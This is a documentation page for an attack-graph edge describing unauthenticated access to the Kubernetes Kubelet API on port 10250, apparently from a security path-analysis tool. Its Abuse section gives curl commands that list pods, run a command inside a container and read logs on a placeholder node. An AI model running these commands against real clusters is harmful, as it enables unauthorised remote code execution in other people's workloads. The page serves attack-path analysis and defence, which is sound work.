# CH_unauthKubeletAccess

## Edge Schema

- **Source:** [CH_ExternalActor](../NodeDescriptions/CH_ExternalActor.md)
- **Target:** [CH_Node](../NodeDescriptions/CH_Node.md)

## General Information

The Kubelet API on the target worker node is accessible without authentication, enabling an external actor with network access to list Pods, exec into containers, or read logs.

## Abuse

The Kubelet API exposes endpoints for listing pods, reading logs, and executing commands in containers. Without authentication, these are accessible directly to anyone with network access to port 10250.

```bash
# List all pods on the node
curl -sk https://<node-ip>:10250/pods | jq .

# Execute a command in a container
curl -sk https://<node-ip>:10250/run/<namespace>/<pod>/<container> \
  -d "cmd=id"

# Read container logs
curl -sk https://<node-ip>:10250/logs/<namespace>/<pod>/<container>
```

## References

- [Kubelet Authentication and Authorization](https://kubernetes.io/docs/reference/access-authn-authz/kubelet-authn-authz/)
- [HackTricks - Kubelet Unauthenticated RCE](https://cloud.hacktricks.xyz/pentesting-cloud/kubernetes-security/pentesting-kubernetes-services#10250-port-kubelet-api)
- [OWASP K06 - Overly Exposed Kubernetes Components](https://owasp.org/www-project-kubernetes-top-ten/2025/en/src/K06-Overly-Exposed-Kubernetes-Components.html)
- [OWASP K07 - Misconfigured And Vulnerable Cluster Components](https://owasp.org/www-project-kubernetes-top-ten/2025/en/src/K07-Misconfigured-And-Vulnerable-Cluster-Components.html)
- [Threat Matrix - Access Kubelet API](https://microsoft.github.io/Threat-Matrix-for-Kubernetes/techniques/Access%20Kubelet%20API/)
